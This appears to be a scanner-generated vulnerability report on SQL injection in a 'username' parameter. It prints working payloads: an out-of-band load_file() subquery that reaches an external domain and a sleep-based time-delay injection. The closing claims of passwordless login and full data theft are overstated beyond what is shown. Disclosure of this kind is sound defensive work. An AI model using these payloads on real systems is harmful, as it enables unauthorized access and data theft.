## Description:
The `username` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\uywkt7rin9jxhw5fjoazxa5yqpwik980bo3btzi.ovchartup.com\\lsm'))+' was submitted in the username parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.  Additionally, a single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.  Additionally, the payload '+(select*from(select(sleep(20)))a)+' was submitted in the username parameter. The application took 20009 milliseconds to respond to the request, compared with 30 milliseconds for the original request, indicating that the injected SQL command caused a time delay. The attacker can get all sensitive information from this system when he attacks it online, He can login super easily WITHOUT PASSWORD - ONLY USER - bypassing, and can crash or get every sensitive information from him!
